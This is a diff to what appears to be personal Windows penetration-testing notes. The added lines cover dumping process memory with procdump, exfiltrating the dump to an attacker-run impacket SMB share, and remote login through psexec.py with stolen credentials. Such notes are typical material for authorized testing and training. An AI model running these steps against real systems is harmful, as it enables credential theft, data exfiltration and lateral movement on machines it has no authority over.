@@ -44,6 +44,28 @@
 	query user		Display active users
 	net accounts		Prints password policy
 
+	get-process		Enumerates running processes
+
+		Use procdump https://learn.microsoft.com/en-us/sysinternals/downloads/procdump , to dump the memory of any interesting running process
+
+			.\procdump.exe -ma <process_id> <output_file>
+		
+		We can use an smb share to download the output_file:
+
+			on our local machine we do
+
+			smbserver.py -smb2support -username guest -password guest share <path_to_folder_we_gonna_share>
+
+			smbserver is a script from impacket
+
+			on the remote machine we do
+
+			net use x: \\<our_local_ip>\share /user:guest guest
+
+			and now we copy the dump file
+
+			cmd /c "copy <filen_name>.dmp X:\"
+
 ## Check communication through processess using pipes
 
 	pipelist.exe /accepteula		enumerate instances of named pipes
@@ -52,6 +74,13 @@
 	accesschk.exe /accepteula \\.\Pipe\<name_of_pipe> -v		Enumerate permissions of pipe. We are looking for a pipe we have WRITE permissions for our user
 		https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
 	accesschk.exe -w \pipe\* -v		Enumerates all pipes that have WRITE permission
+
+
+## Remote Login with usermae and password
+
+We can try doing remote logins with useranmes and passwords using a script from impacket
+
+	psexec.py '<username>:<password>@<remote_host_ip>'
 
 
 ## Try WinPeas
